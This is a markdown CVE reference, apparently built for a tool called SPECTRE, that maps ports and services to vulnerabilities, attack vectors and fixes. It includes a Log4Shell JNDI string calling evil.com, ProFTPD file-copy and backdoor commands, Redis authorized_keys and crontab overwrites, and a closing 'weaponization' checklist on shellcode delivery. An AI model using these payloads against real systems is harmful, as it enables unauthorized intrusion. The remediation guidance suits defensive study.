# Critical CVE & Attack Vector Knowledge Base for SPECTRE

This collection provides quick offline reference mappings between network services, vulnerability patterns, Common Vulnerabilities and Exposures (CVEs), and remediation blueprints.

---

## 1. High-Impact CVE Catalog by Port & Service

### Port 21: File Transfer Protocol (FTP)
- **vsftpd 2.3.4 (Backdoor Command Execution):**
  - **CVE:** CVE-2011-2523 (CVSS 9.8)
  - **Vector:** Triggered by user ending in `:)`. Opens a root backdoor listener on port 6200.
  - **Remediation:** Upgrade to vsftpd >= 3.0.5 or disable legacy anonymous FTP.
- **ProFTPD 1.3.5 (mod_copy Arbitrary File Copy):**
  - **CVE:** CVE-2015-3306 (CVSS 9.8)
  - **Vector:** Unauthenticated site command execution allows copying arbitrary files to web roots (`CPFR /etc/passwd`, `CPTO /var/www/html/backdoor.php`).
  - **Remediation:** Upgrade to ProFTPD >= 1.3.6 or unload `mod_copy`.

### Port 22: OpenSSH
- **OpenSSH RegreSSHion (Unauthenticated Remote Code Execution):**
  - **CVE:** CVE-2024-6387 (CVSS 8.1)
  - **Vector:** Signal handler race condition in `sshd` on glibc-based Linux systems leads to remote root code execution.
  - **Remediation:** Upgrade to OpenSSH >= 9.8p1 or set `LoginGraceTime 0` as emergency workaround.
- **OpenSSH Terrapin Attack:**
  - **CVE:** CVE-2023-48795 (CVSS 5.9)
  - **Vector:** Prefix truncation attack during SSH handshake breaking integrity of ChaCha20-Poly1305 or CBC-EtM ciphers.
  - **Remediation:** Upgrade OpenSSH and enforce strict key exchange extension (`kex-strict`).

### Port 80 / 443: Web Servers & Frameworks
- **Apache HTTP Server Path Traversal & RCE:**
  - **CVE:** CVE-2021-41773 & CVE-2021-42013 (CVSS 9.8)
  - **Vector:** Flawed path normalization allows directory traversal outside DocumentRoot via `.%2e/` and CGI script execution.
  - **Remediation:** Upgrade to Apache HTTP Server >= 2.4.51.
- **Apache Log4j2 JNDI Remote Code Execution (Log4Shell):**
  - **CVE:** CVE-2021-44228 (CVSS 10.0)
  - **Vector:** JNDI lookups in logged user strings (`${jndi:ldap://evil.com/a}`) execute arbitrary Java bytecode.
  - **Remediation:** Upgrade Log4j to >= 2.17.1; disable message lookup pattern substitution.
- **Spring Framework RCE (Spring4Shell):**
  - **CVE:** CVE-2022-22965 (CVSS 9.8)
  - **Vector:** ClassLoader manipulation via data binding on JDK 9+ when deployed on Apache Tomcat as WAR.
  - **Remediation:** Upgrade Spring Framework to >= 5.3.18 or 5.2.20.

### Port 445: Server Message Block (SMB)
- **EternalBlue (MS17-010):**
  - **CVE:** CVE-2017-0144 (CVSS 8.1)
  - **Vector:** Memory corruption in SMBv1 buffer handling allows unauthenticated remote ring-0 kernel code execution.
  - **Remediation:** Apply MS17-010 update; completely disable SMBv1 across domain.
- **SMBGhost:**
  - **CVE:** CVE-2020-0796 (CVSS 10.0)
  - **Vector:** Integer overflow in SMBv3.1.1 compression decompression routine.
  - **Remediation:** Apply KB4551762 patch; disable SMBv3 compression via PowerShell.

### Port 6379: Redis
- **Redis Unauthorized Access & Remote Code Execution:**
  - **Mechanisms:**
    1. Unauthenticated root SSH authorized_keys overwrite via `CONFIG SET dir /root/.ssh/` and `SAVE`.
    2. Crontab overwrite via `/var/spool/cron/crontabs/root`.
    3. Lua sandbox escape via `EVAL` in unpatched versions.
  - **Remediation:** Bind to `127.0.0.1`, set strong `requirepass`, enable TLS, rename dangerous commands (`CONFIG`, `FLUSHALL`, `FLUSHDB`).

---

## 2. Exploitation Checklist & Weaponization Rules
1. **Always verify target architecture:** Confirm x86_64 vs aarch64 before delivering compiled shellcode.
2. **Handle Bad Characters:** Ensure shellcode escapes null bytes (`\x00`), carriage return (`\r`), newline (`\n`), and spaces (`\x20`) depending on protocol constraints.
3. **Check Canary & ASLR Protections:** Use `checksec` on binaries before designing stack overflow payloads.
4. **Prefer Staged Payloads:** When buffer space is constrained (< 100 bytes), use egg hunters or socket-reuse stages.
